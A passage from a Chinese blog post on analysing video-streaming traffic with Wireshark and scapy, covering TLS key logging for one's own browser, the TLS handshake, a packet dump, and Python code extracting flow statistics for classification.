class="hljs-string">&quot;C:\Program Files (x86)\Google\Chrome\Application\chrome.exe&quot;</span> --ssl-key-<span class="hljs-built_in">log</span>-file = <span class="hljs-string">&quot;E:\sslkey.log&quot;</span><br></code></pre></td></tr></table></figure><p>即可。<br>然后再在 wireshark 中绑定<br><img src="https://image.hackerjerry.top/Analysis-video-traffic-with-wireshark-2.png#align=left&display=inline&height=255&margin=%5Bobject%20Object%5D&name=image.png&originHeight=509&originWidth=727&size=33775&status=done&style=none&width=363.5" alt="image.png"><br><del>但是还是不行，不知道什么原因，可能是没有重启电脑？协商的 sslkey 不能随时更新到 log 文件中，我也不知道为什么，就先不管它的传输层 tcp 报文原始信息了。</del><br><del>确实重启电脑就好了。</del></p><h1 id="业务流程"><a href="#业务流程" class="headerlink" title="业务流程"></a>业务流程</h1><p>网络视频业务可以从 1.主页访问，2.外链链入。<br>不同网站视频页面的 url 格式不同。</p><table><thead><tr><th align="center"><strong>业务提供商</strong></th><th align="center"><strong>视频页面的 url 正则表达式</strong></th></tr></thead><tbody><tr><td align="center">优酷</td><td align="center">v.youku.com/v<em>show/id</em>[A-Za-z0-9=]{17}.*</td></tr><tr><td align="center">优酷移动端</td><td align="center">.*api.(mobile</td></tr><tr><td align="center">搜狐视频</td><td align="center">tv.sohu.com/[0-9]{8}/n[0-9]{9}.*</td></tr><tr><td align="center">腾讯视频</td><td align="center">v.qq.com/x/cover/[a-z0-9]{15}.*</td></tr><tr><td align="center">爱奇艺</td><td align="center">www.iqiyi.com/[a-z]_[a-z0-9]{10}.*</td></tr><tr><td align="center">CNTV</td><td align="center">tv.cntv.cn/video/[A-Za-z0-9=]{16}/.*</td></tr><tr><td align="center">PPTV</td><td align="center">v.pptv.com/show/[A-Za-z0-9=]{16}/.*</td></tr></tbody></table><p>用户在观看视频时，可能会有一系列交互动作，可以分成两类：播放操作与社交行为。<br>前者包括：</p><ul><li>暂停</li><li>重新播放</li><li>跳转</li><li>调节清晰度</li><li>静音</li><li>调节播放速度等</li></ul><p>后者包括：</p><ul><li>评论</li><li>收藏</li><li>点赞</li><li>分享等</li></ul><h2 id="通信报文分析"><a href="#通信报文分析" class="headerlink" title="通信报文分析"></a>通信报文分析</h2><p>【1】<a href="https://segmentfault.com/a/1190000018746027">https://segmentfault.com/a/1190000018746027</a><br>【2】<a href="https://www.jianshu.com/p/a3a25c6627ee">https://www.jianshu.com/p/a3a25c6627ee</a><br>【3】<a href="https://www.dell.com/community/%E5%85%A5%E9%97%A8%E7%BA%A7%E5%92%8C%E4%B8%AD%E7%AB%AF/%E5%A6%82%E6%9E%9C%E7%9C%8B%E4%BA%86%E8%BF%99%E4%B8%AA%E4%BD%A0%E8%BF%98%E6%98%AF%E4%B8%8D%E4%BC%9A%E7%94%A8Wireshark-%E9%82%A3%E5%B0%B1%E6%9D%A5%E6%89%BE%E6%88%91%E5%90%A7-8%E6%9C%886%E6%97%A5%E5%AE%8C%E7%BB%93/td-p/7007033">https://www.dell.com/community/</a><br>【4】<a href="https://imququ.com/post/http2-traffic-in-wireshark.html">https://imququ.com/post/http2-traffic-in-wireshark.html</a><br>对于腾讯视频 5 分钟的观看抓包。<br>得到以下结论：</p><ul><li>首先进行 TCP 三次握手</li></ul><p><img src="https://image.hackerjerry.top/Analysis-video-traffic-with-wireshark-3.png#align=left&display=inline&height=45&margin=%5Bobject%20Object%5D&name=image.png&originHeight=69&originWidth=1141&size=10848&status=done&style=none&width=746" alt="image.png"></p><ul><li>然后进行 ssl 层的 tls 连接。</li></ul><p><img src="https://image.hackerjerry.top/Analysis-video-traffic-with-wireshark-4.png#align=left&display=inline&height=53&margin=%5Bobject%20Object%5D&name=image.png&originHeight=91&originWidth=1287&size=15828&status=done&style=none&width=746" alt="image.png"></p><ol><li><strong>Client Hello</strong><ol><li><strong>Client Hello</strong> 报文：客户端对加密算法的支持度不同，因此需要<strong>向服务端发送</strong>客户端支持的<strong>加密套件（Cipher Suite）</strong> ，同时还要生成一个 <strong>随机数</strong> 同时保存在客户端和发送给服务</li></ol></li><li><strong>Server Hello</strong><ol><li><strong>ServerCertificate</strong> 报文：服务端收到 Client Hello 之后，向客户端发送 <strong>CA 认证的数字证书</strong>，用来鉴别服务端身份信息，同时还要生成一个 <strong>随机数</strong> 同时保存在服务端和发送给客户端</li><li><strong>Server Hello Done</strong> 报文：表示服务端宣告第一阶段的客户端服务端握手协商结束</li><li>可选：<strong>Certificate Request</strong> 报文：必要情况下，要求客户端发送证书验证身份</li><li>可选：<strong>Server Key Exchange</strong> 报文：如果 CA 认证的数字证书提供的信息不够，服务端还可发送提供补充信息</li></ol></li><li><strong>Client Finish</strong><ol><li><strong>Client Key Exchange</strong> 报文：客户端收到 CA 数字证书并通过验证，然后通过 CA 公钥解密获取到 <strong>服务端公钥</strong>。Client Key Exchange 报文包括有一个随机数，这个随机数被称为 <strong>Pre-master key/secret</strong>；一个表示随后的信息使用双方协商好的加密方法和密钥发送的 <strong>通知</strong> ；还有一个通过协商好的 HASH 算法对前面所有信息内容的 <strong>HASH 计算值</strong>，用来提供服务端校验。这些信息都通过服务端公钥加密传送给服务端</li><li><strong>ClientCipherSpec</strong> 报文：该报文通知服务端，此后的通信都将使用协商好的加密算法计算对称密钥进行加密通信（也就是使用两个随机数以及第三个 Pre-master key/secret 随机数一起算出一个对称密钥 <strong>session key/secret</strong>）</li><li><strong>Finished</strong> 报文：该报文包括连接至此的所有报文的校验值，使用服务端公钥进行加密</li><li>可选：<strong>ClientCertificate</strong> 报文：如果服务端请求，客户端需要发送 CA 数字证书</li><li>可选：<strong>CertificateVerify</strong> 报文：服务端如果要求 CA 数字证书，那么需要通过 HASH 算法计算一个服务端发送来的信息摘要</li></ol></li><li><strong>Server Finish</strong><ol><li>服务端最后对客户端发送过来的 <strong>Finished</strong> 报文使用服务端私钥进行解密校验</li><li><strong>ClientCipherSpec</strong> 报文：报文通知服务端，此后的通信都将使用协商好的加密算法计算对称密钥 session key/secret 进行加密通信</li><li><strong>Finished</strong> 报文：标志 TLS 连接建立成功</li></ol></li><li>TLS 握手成功此后通过对称密钥 session key/secret 加密通信</li></ol><ul><li>然后开始 http 请求对话，这里发出一个 GET 请求</li></ul><p><img src="https://image.hackerjerry.top/Analysis-video-traffic-with-wireshark-5.png#align=left&display=inline&height=33&margin=%5Bobject%20Object%5D&name=image.png&originHeight=65&originWidth=1572&size=15127&status=done&style=none&width=786" alt="image.png"><br><img src="https://image.hackerjerry.top/Analysis-video-traffic-with-wireshark-6.png#align=left&display=inline&height=366&margin=%5Bobject%20Object%5D&name=image.png&originHeight=474&originWidth=817&size=61104&status=done&style=none&width=631" alt="image.png"><br>可以看到目标 host 格式为 v.smtcdns.com，可见是一个 cdn 节点。<br>然后就是 TCP 流<br><img src="https://image.hackerjerry.top/Analysis-video-traffic-with-wireshark-7.png#align=left&display=inline&height=223&margin=%5Bobject%20Object%5D&name=image.png&originHeight=362&originWidth=1024&size=46560&status=done&style=none&width=631" alt="image.png"><br>这里无法解析 TCP 的报文具体信息，应该就是相应的视频流。<br>在所有 tcp 分片发完之后，然后服务器发送一个 http 200,返回的内容是 video,采用 MP2T 编码。<img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1612014103338-752dc6c7-7225-40ca-8136-445428457c5b.png#align=left&display=inline&height=21&margin=%5Bobject%20Object%5D&name=image.png&originHeight=41&originWidth=1459&size=7797&status=done&style=none&width=729.5" alt="image.png"><br><img src="https://image.hackerjerry.top/Analysis-video-traffic-with-wireshark-8.png#align=left&display=inline&height=333&margin=%5Bobject%20Object%5D&name=image.png&originHeight=435&originWidth=702&size=40911&status=done&style=none&width=537" alt="image.png"><br>然后再次重复上面的过程。<br>整个观看视频过程中产生的 http 报文过滤后如下<br><img src="https://image.hackerjerry.top/Analysis-video-traffic-with-wireshark-9.png#align=left&display=inline&height=228&margin=%5Bobject%20Object%5D&name=image.png&originHeight=347&originWidth=1053&size=44535&status=done&style=none&width=693" alt="image.png"></p><h1 id="使用-python-进行自动化分析与特征提取"><a href="#使用-python-进行自动化分析与特征提取" class="headerlink" title="使用 python 进行自动化分析与特征提取"></a>使用 python 进行自动化分析与特征提取</h1><p>【1】<a href="https://github.com/SewellDinG/scapy-ssl_tls-demo">https://github.com/SewellDinG/scapy-ssl_tls-demo</a><br>【2】<a href="https://github.com/hackers-terabit/scapy-ssl_tls-python3">https://github.com/hackers-terabit/scapy-ssl_tls-python3</a><br>【3】<a href="http://blog.whiterabbitxyj.com/2017/11/07/python-scapy/">http://blog.whiterabbitxyj.com/2017/11/07/python-scapy/</a><br>【4】<a href="https://wizardforcel.gitbooks.io/scapy-docs/content/3.html">https://wizardforcel.gitbooks.io/scapy-docs/content/3.html</a><br>【5】<a href="https://www.osgeo.cn/scapy/layers/http.html">https://www.osgeo.cn/scapy/layers/http.html</a><br>【6】<a href="https://www.osgeo.cn/scapy/usage.html">https://www.osgeo.cn/scapy/usage.html</a><br>【7】<a href="https://scapy.readthedocs.io/en/latest/api/scapy.layers.tls.html">https://scapy.readthedocs.io/en/latest/api/scapy.layers.tls.html</a><br>首先，scapy 在 2.4.0 已经开始支持 http 和 tls 的解析，但是在默认配置中没有添加，可以通过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> scapy.all <span class="hljs-keyword">import</span> *<br>load_layer(<span class="hljs-string">&#x27;tls&#x27;</span>)<br>load_layer(<span class="hljs-string">&#x27;http&#x27;</span>)<br></code></pre></td></tr></table></figure><p>进行手动导入。</p><blockquote><p>这里真的坑了我好久，我一直在安装那个 tls 的补充包，但安不上，读了很多文档才琢磨出来</p></blockquote><p>不过也仅仅是能解析到 tls 层，而 http 层由于加密仍然无法解析。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">###[ Ethernet ]###</span><br>  dst       = <span class="hljs-number">54</span>:a7:<span class="hljs-number">03</span>:d3:a3:<span class="hljs-number">91</span><br>  src       = <span class="hljs-number">42</span>:<span class="hljs-number">23</span>:<span class="hljs-number">09</span>:<span class="hljs-number">71</span>:f5:<span class="hljs-number">85</span><br>  type      = IPv4<br><span class="hljs-comment">###[ IP ]###</span><br>     version   = <span class="hljs-number">4</span><br>     ihl       = <span class="hljs-number">5</span><br>     tos       = <span class="hljs-number">0x0</span><br>     len       = <span class="hljs-number">1033</span><br>     id        = <span class="hljs-number">21817</span><br>     flags     = DF &lt;--对应分片<br>     frag      = <span class="hljs-number">0</span><br>     ttl       = <span class="hljs-number">128</span><br>     proto     = <span class="hljs-number">6</span><br>     chksum    = <span class="hljs-number">0x9daf</span><br>     src       = <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.101</span><br>     dst       = <span class="hljs-number">60.233</span><span class="hljs-number">.5</span><span class="hljs-number">.16</span><br>     \options   \<br><span class="hljs-comment">###[ TCP ]###</span><br>        sport     = <span class="hljs-number">50503</span><br>        dport     = <span class="hljs-number">443</span><br>        seq       = <span class="hljs-number">1900018089</span><br>        ack       = <span class="hljs-number">3368278776</span><br>        dataofs   = <span class="hljs-number">8</span><br>        reserved  = <span class="hljs-number">0</span><br>        flags     = PA &lt;--对应SYN, FIN, ACK, PSH, RST, URG<br>        window    = <span class="hljs-number">4116</span><br>        chksum    = <span class="hljs-number">0xe752</span><br>        urgptr    = <span class="hljs-number">0</span><br>        options   = [(<span class="hljs-string">&#x27;NOP&#x27;</span>, <span class="hljs-literal">None</span>), (<span class="hljs-string">&#x27;NOP&#x27;</span>, <span class="hljs-literal">None</span>), (<span class="hljs-string">&#x27;Timestamp&#x27;</span>, (<span class="hljs-number">2543536</span>, <span class="hljs-number">2295788294</span>))]<br><span class="hljs-comment">###[ TLS ]###</span><br>           type      = application_data<br>           version   = TLS <span class="hljs-number">1.2</span><br>           len       = <span class="hljs-number">976</span>    [deciphered_len= <span class="hljs-number">976</span>]<br>           iv        = <span class="hljs-string">b&#x27;&#x27;</span><br>           \msg       \<br>            |<span class="hljs-comment">###[ TLS Application Data ]###</span><br>            |  data      = <span class="hljs-string">&#x27;\x00\x00\x00\x00\x00\x00\x00\x02\xf4\xae\x1e\x90P\x058\x0bd\xae\xae\x14\x86\xfd\xb4\x19\xb3E\xc3\x86\x1fg\xf5\x8a)\xdf@\xe4\xf0|Q%Ay\xb3\xb0^\xf1\xe2\r\xb3\xf7\xb0\xab\xb5eFe@\xe3\x9c\xf5o\xaa\xb3\x13\x8d\xc9^G\x10\xc7\x90\xf5\xe7FM\x80\xfcAH\xf88\xf5\xea\x86K%EB\xbft\xc23\xbavv\xae\xda\xbf\x07\x90\xc6\x12\x1f\x81v\xcdl\xd3\xb0\xe7p\xcf\xb1\xac\xceK\x1f\xdf4\xbb\xbc\x93\x81E\xdd\xda\x96\xd0\xae+\x80\xb3\x8e\x84\xdf^&quot;ig]w\xc0\xe8P\x92\x1a!3\xca\xb4\x0b\xc3\x83&lt;B\x10\x80\xa5\xeb9F\xde\xbc\xf1\xf6\x91\xaac\x15\x85\xc7rs\xfeP0\x15\x02H~Ba\x104\x89~MP&lt;x\xbc\xfe$|\xd6\x9de\xff\x9b\xfe\x11\xf2]\x87\xa9\xc1\x84yT\xe9R*\x9cVP-Q\x15\xeb\x99\xde@\xc4,\xads\xb1\xcd\x8f\xcb\x9e\xe8@PE\xdd\xab\x1b*\xd1I-\x96Oa\x8e\xc5\xbest\xd0\xbe\x03&#123;r\xe3f\x17\xebx\xbd\x8b\xde~B&amp;\xfe&quot;\xa9d\xd4\xdaZH|\xce\xdb$\xe2P7F\x83\x14\xa0i\x8f\x9a\xe5VL\xf9\x87U\x94\xf8\xe3]\xfd[\x84(\rOs\xc9CG\x9d\xe8\x8eo,\xed\x94\xe0\xfaT\x87\x9d\xe1e\x8d\xea\x19+\xed\x0b\xf9\xea\x8d\xdc\xca\x0c\xa8\x85_\x9aF\xaanF\xa6b\xd0\xc0\xe4B\xdb\xec\x13[\x14)\xcc\x7f\xb0\x83\xe7\xae\xb5b\x04;y\x83ZE\x19C\x18\x01#e\xc8f\xb7@\x86\xae\xd8u\x944f\xe1\x82\xec\xe8]\x0c\x8f&amp;\x8c\x9d\xe5&lt;\x88J2\xc4&quot;\rev&quot;\xe1@\x05\xbc\xc2\x7f\x98\x07\xae\x9e\xab\xa9\x892`%\xe7\xecxX\xb94\xb8:\xf3\xa3\x07\x18\xe4\xe9\x99N\xf0\xc3\x85\xca\xbe\x93\xc0~\xe6\xa5\xbaf\xc1\xdc\&#x27;\xb6\xf1W\xcf\xb7\x06\xf4`\x1d\xc4\xe6|\xd1\xd1\x05\x7f\x8f\x9d\x8c\xb5&amp;\x8btr\xc5=\xe0\x9f\xb4S\x93&lt;\x96/\xb8\xd1CE\x10\x82\x8a\xf7\xef\x9b\x81h\xa5y(\xedw\xe4[o\xaa\x1c\xe6\xed\xf0\xaa\x82t\xc5;\x8a\nk\x9a\xe1&lt;\xc6\x03L\xd8\xc1S\xd2\x08\x08\xaf\xa54%\xed\xed\xc8*\x95\xd4\xfd\xf8\xf9D\xdf6\x16\xf8\x11\t?\xbc\xe7\x1e\xcc&lt;\xff\xda\xe9\xa6\xd8 l\x83\xe8\xd93?C#&#125;7KI\xdeVt$\xa5\xdc\xba\x0fL\x9b\x19(\t\xb5U\xd5\x82\xc0*\xb7\xf2\xda2dW!\x7fRF\xcf\xa6Qk\xcfD\xf8G\xac\xee\xe8F\xe6\x8e(Q\x91\xd9\xeb^C\xb3I\xea\n\xc1\xd84\xd4\x9d\xcc=Yt\xf0&quot;|xo\xb4p\xaf\xc85\xad\r\xd4&amp;\xd9\xbd\x85\x8b&gt;Tv\\\x06\x19@G\x0f\xfdF\x7f\x174M+\x17/7\xb7\xe8!T\xf5h\xf3\xffQ\xdd\x1e\xfc\xe5\xc4L`\xf5\x12T\x14\xb1\\\xd3F\xb1\x95\xab)\x1at\xc0$\xca\x00\xf46\xc8\xc0\x94\xab(g\xb7.\xcf\xa0|%\xfe\xa6\xb2UJ\xbd\x1eZ2w2H(\xedz&gt;\x02\x11\xb2;\xbe\xe1\x1c\xc6\xe2\xfa\xb6\x19\xd5\xc0\xe2Z\x16\x87O8\xdcs\&#x27;\xc1:\xc8\xd4\x9e&amp;o\xc5\x1b;\x86\xb2\x00\xe50\xba&lt;\xbe\xa8\x14\xd2\xc9\xe7\xc1#\&#x27;\x8e\xaa\x82\xc9\xf1\xd0\xdak\xe5DS\x95\xc3k\x8f\xf1\xdaa\xbdC\xb2\xadk\x04\x024\\)\xa9\x86X\x0e\x99h\x93\xf8\x88\xba\xaf\x9f\xb6X(\xcep\xd3\x87\xba=\tr1k`&quot;\x94$4A\xf9(\x1e\xa9\x9f\x83\x8f\xe8YVOK\xa8_&#125;\xc0)-\x14\xf1\x15V[j,\xd3`\xa0\xeaD\xa2\x08N!\xd1\x92\xb8\xe0D\x86K.\xf8\xcfGb\x943mGB\x9b,~\xe4\xcdR\xd4s\x19\xd5\xfeb\x94\xd7u\xcd\xc5\xa4\x1f\xfbBS\x0c\x8e\x06\xf2\x95\xd05\x80\x08\xbdh\xbb\xd6\xe4\x04&amp;\xc4&#123;\x12&#125;\&#x27;-\xc7O&#125;]\xbd\xd0\xf8\xaep\x9c\xb6\rH\x0e6,\xab\xb0\xf3k\x00\xb4\x16\x04\x1b\x13:,=\x8d\xbf\x99\x03&#x27;</span><br>           mac       = <span class="hljs-string">b&#x27;&#x27;</span><br>           pad       = <span class="hljs-string">b&#x27;&#x27;</span><br>           padlen    = <span class="hljs-literal">None</span><br><br><span class="hljs-literal">None</span><br></code></pre></td></tr></table></figure><p>暂时没有找到如何像 wireshark 一样可以实时绑定密钥进行会话解密的 python 命令行方式，所以提取特征只限制在 tls 层及以下。也就是说，诸如 http 的状态码，请求类型，实体内容类型都无法解析</p><h2 id="提取特征"><a href="#提取特征" class="headerlink" title="提取特征"></a>提取特征</h2><p>首先，确定提取的特征名称。<br>首先是五元组特征：(源 IP,目的 IP,源端口,目的端口,协议类型）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">feature_name=[<span class="hljs-string">&#x27;fiat_mean&#x27;</span>,<span class="hljs-string">&#x27;fiat_min&#x27;</span>,<span class="hljs-string">&#x27;fiat_max&#x27;</span>,<span class="hljs-string">&#x27;fiat_std&#x27;</span>,<span class="hljs-string">&#x27;biat_mean&#x27;</span>,<span class="hljs-string">&#x27;biat_min&#x27;</span>,<span class="hljs-string">&#x27;biat_max&#x27;</span>,<span class="hljs-string">&#x27;biat_std&#x27;</span>,<br>             <span class="hljs-string">&#x27;diat_mean&#x27;</span>,<span class="hljs-string">&#x27;diat_min&#x27;</span>,<span class="hljs-string">&#x27;diat_max&#x27;</span>,<span class="hljs-string">&#x27;diat_std&#x27;</span>,<span class="hljs-string">&#x27;duration&#x27;</span>,<span class="hljs-string">&#x27;fwin_total&#x27;</span>,<span class="hljs-string">&#x27;fwin_mean&#x27;</span>,<span class="hljs-string">&#x27;fwin_min&#x27;</span>,<br>             <span class="hljs-string">&#x27;fwin_max&#x27;</span>,<span class="hljs-string">&#x27;fwin_std&#x27;</span>,<span class="hljs-string">&#x27;bwin_total&#x27;</span>,<span class="hljs-string">&#x27;bwin_mean&#x27;</span>,<span class="hljs-string">&#x27;bwin_min&#x27;</span>,<span class="hljs-string">&#x27;bwin_max&#x27;</span>,<span class="hljs-string">&#x27;bwin_std&#x27;</span>,<span class="hljs-string">&#x27;dwin_total&#x27;</span>,<br>             <span class="hljs-string">&#x27;dwin_mean&#x27;</span>,<span class="hljs-string">&#x27;dwin_min&#x27;</span>,<span class="hljs-string">&#x27;dwin_max&#x27;</span>,<span class="hljs-string">&#x27;dwin_std&#x27;</span>,<span class="hljs-string">&#x27;fpnum&#x27;</span>,<span class="hljs-string">&#x27;bpnum&#x27;</span>,<span class="hljs-string">&#x27;dpnum&#x27;</span>,<span class="hljs-string">&#x27;bfpnum_rate&#x27;</span>,<span class="hljs-string">&#x27;fpnum_s&#x27;</span>,<br>             <span class="hljs-string">&#x27;bpnum_s&#x27;</span>,<span class="hljs-string">&#x27;dpnum_s&#x27;</span>,<span class="hljs-string">&#x27;fpl_total&#x27;</span>,<span class="hljs-string">&#x27;fpl_mean&#x27;</span>,<span class="hljs-string">&#x27;fpl_min&#x27;</span>,<span class="hljs-string">&#x27;fpl_max&#x27;</span>,<span class="hljs-string">&#x27;fpl_std&#x27;</span>,<span class="hljs-string">&#x27;bpl_total&#x27;</span>,<span class="hljs-string">&#x27;bpl_mean&#x27;</span>,<br>             <span class="hljs-string">&#x27;bpl_min&#x27;</span>,<span class="hljs-string">&#x27;bpl_max&#x27;</span>,<span class="hljs-string">&#x27;bpl_std&#x27;</span>,<span class="hljs-string">&#x27;dpl_total&#x27;</span>,<span class="hljs-string">&#x27;dpl_mean&#x27;</span>,<span class="hljs-string">&#x27;dpl_min&#x27;</span>,<span class="hljs-string">&#x27;dpl_max&#x27;</span>,<span class="hljs-string">&#x27;dpl_std&#x27;</span>,<span class="hljs-string">&#x27;bfpl_rate&#x27;</span>,<br>             <span class="hljs-string">&#x27;fpl_s&#x27;</span>,<span class="hljs-string">&#x27;bpl_s&#x27;</span>,<span class="hljs-string">&#x27;dpl_s&#x27;</span>,<span class="hljs-string">&#x27;fin_cnt&#x27;</span>,<span class="hljs-string">&#x27;syn_cnt&#x27;</span>,<span class="hljs-string">&#x27;rst_cnt&#x27;</span>,<span class="hljs-string">&#x27;pst_cnt&#x27;</span>,<span class="hljs-string">&#x27;ack_cnt&#x27;</span>,<span class="hljs-string">&#x27;urg_cnt&#x27;</span>,<span class="hljs-string">&#x27;cwe_cnt&#x27;</span>,<span class="hljs-string">&#x27;ece_cnt&#x27;</span>,<br>             <span class="hljs-string">&#x27;fwd_pst_cnt&#x27;</span>,<span class="hljs-string">&#x27;fwd_urg_cnt&#x27;</span>,<span class="hljs-string">&#x27;bwd_pst_cnt&#x27;</span>,<span class="hljs-string">&#x27;bwd_urg_cnt&#x27;</span>,<span class="hljs-string">&#x27;fp_hdr_len&#x27;</span>,<span class="hljs-string">&#x27;bp_hdr_len&#x27;</span>,<span class="hljs-string">&#x27;dp_hdr_len&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span><br>            <span class="hljs-string">&#x27;f_ht_len&#x27;</span>,<span class="hljs-string">&#x27;b_ht_len&#x27;</span>,<span class="hljs-string">&#x27;d_ht_len&#x27;</span>]<br></code></pre></td></tr></table></figure><p>其中</p><ul><li>13 个包的到达特征</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># feature about packet arrival interval 13</span><br>        fiat_mean,fiat_min,fiat_max,fiat_std = packet_iat(fwd_flow)<span class="hljs-comment">#正向发送的两个数据包之间的平均时间,正向发送的两个数据包之间的最短时间,正向发送的两个数据包标准偏差</span><br>        biat_mean,biat_min,biat_max,biat_std = packet_iat(bwd_flow)<span class="hljs-comment">#反向发送的两个数据包之间的平均时间,...</span><br>        diat_mean,diat_min,diat_max,diat_std = packet_iat(pkts)<span class="hljs-comment">#两次流动之间的平均时间,...</span><br>        duration = round(pkts[<span class="hljs-number">-1</span>].time - pkts[<span class="hljs-number">0</span>].time+ decimal.Decimal(<span class="hljs-number">0.0001</span>), <span class="hljs-number">6</span>) <span class="hljs-comment">#流动持续时间</span><br></code></pre></td></tr></table></figure><ul><li>15 个拥塞窗口特征</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 拥塞窗口大小特征 15</span><br>        fwin_total,fwin_mean,fwin_min,fwin_max,fwin_std = packet_win(fwd_flow)<br>        bwin_total,bwin_mean,bwin_min,bwin_max,bwin_std = packet_win(bwd_flow)<br>        dwin_total,dwin_mean,dwin_min,dwin_max,dwin_std = packet_win(pkts)<br></code></pre></td></tr></table></figure><ul><li>7 个包的数量特征</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># feature about packet num  7</span><br>        fpnum=len(fwd_flow) <span class="hljs-comment">#前向总包数</span><br>        bpnum=len(bwd_flow) <span class="hljs-comment">#反向总包数</span><br>        dpnum=fpnum+bpnum<br>        bfpnum_rate = round(bpnum / (fpnum + <span class="hljs-number">0.001</span>), <span class="hljs-number">6</span>)<br>        fpnum_s = round(fpnum / duration, <span class="hljs-number">6</span>)<br>        bpnum_s = round(bpnum / duration, <span class="hljs-number">6</span>)<br>        dpnum_s = round(dpnum / duration, <span class="hljs-number">6</span>) <span class="hljs-comment">#流数据包速率，即每秒传输的数据包数</span><br></code></pre></td></tr></table></figure><ul><li>19 个包的总长度特征</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 包的总长度 19</span><br>        fpl_total,fpl_mean,fpl_min,fpl_max,fpl_std = packet_len(fwd_flow)<span class="hljs-comment">#正向报文总大小,正向报文的平均大小,...</span><br>        bpl_total,bpl_mean,bpl_min,bpl_max,bpl_std = packet_len(bwd_flow)<br>        dpl_total,dpl_mean,dpl_min,dpl_max,dpl_std = packet_len(pkts)<br>        bfpl_rate = round(bpl_total / (fpl_total + <span class="hljs-number">0.001</span>), <span class="hljs-number">6</span>)<br>        fpl_s = round(fpl_total / duration, <span class="hljs-number">6</span>)<br>        bpl_s = round(bpl_total / duration, <span class="hljs-number">6</span>)<br>        dpl_s = round(dpl_total / duration, <span class="hljs-number">6</span>) <span class="hljs-comment">#流字节率，即每秒传输的数据包数</span><br></code></pre></td></tr></table></figure><ul><li>12 个包的标志特征</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 包的标志特征 12</span><br>       fin_cnt,syn_cnt,rst_cnt,pst_cnt,ack_cnt,urg_cnt,cwe_cnt,ece_cnt=packet_flags(pkts,<span class="hljs-number">0</span>)<span class="hljs-comment">#FIN的报文数,SYN报文数,...</span><br>       fwd_pst_cnt,fwd_urg_cnt=packet_flags(fwd_flow,<span class="hljs-number">1</span>)<span class="hljs-comment">#在正向传输的数据包中设置PSH标志的次数,URG标志的次数</span><br>       bwd_pst_cnt,bwd_urg_cnt=packet_flags(bwd_flow,<span class="hljs-number">1</span>)<span class="hljs-comment">#在反向传输的数据包中设置PSH标志的次数,URG标志的次数</span><br></code></pre></td></tr></table></figure><ul><li>6 个包的头部特征</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 包头部长度 6</span><br>        fp_hdr_len=packet_hdr_len(fwd_flow)<br>        bp_hdr_len=packet_hdr_len(bwd_flow)<br>        dp_hdr_len=packet_hdr_len(pkts)<br>        f_ht_len=round(fp_hdr_len /(fpl_total+<span class="hljs-number">1</span>), <span class="hljs-number">6</span>)<br>        b_ht_len=round(bp_hdr_len /(bpl_total+<span class="hljs-number">1</span>), <span class="hljs-number">6</span>)<br>        d_ht_len=round(dp_hdr_len /dpl_total, <span class="hljs-number">6</span>)<br></code></pre></td></tr></table></figure><p>这里介绍一种快速过滤的方法。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> scapy.all <span class="hljs-keyword">import</span> *<br>packets = rdpcap(<span class="hljs-string">&#x27;/content/drive/MyDrive/network_trafic_analysis/qqlarge.pcap&#x27;</span>)<br>tcp_p = packets.filter(<span 